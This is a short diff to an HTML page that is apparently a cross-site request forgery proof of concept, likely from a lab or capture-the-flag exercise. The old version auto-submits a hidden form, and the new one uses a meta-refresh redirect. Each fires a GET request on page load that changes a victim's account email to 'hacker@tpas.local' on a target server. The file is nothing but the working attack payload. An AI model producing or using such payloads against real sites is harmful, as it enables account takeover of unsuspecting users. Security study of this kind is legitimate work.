@@ -2,21 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Account Settings CSRF</title>
+    <title>Redirect</title>
+    <meta http-equiv="refresh"
+          content="0;url=http://100.101.228.35:6009/settings/email?new=hacker%40tpas.local">
 </head>
 <body>
-    <form id="exploitForm"
-          action="http://100.101.228.35:6009/settings/email"
-          method="GET"
-          target="_top">
-
-        <input type="hidden"
-               name="new"
-               value="hacker@tpas.local">
-    </form>
-
-    <script>
-        document.getElementById("exploitForm").submit();
-    </script>
+    <p>Redirecting...</p>
 </body>
 </html>
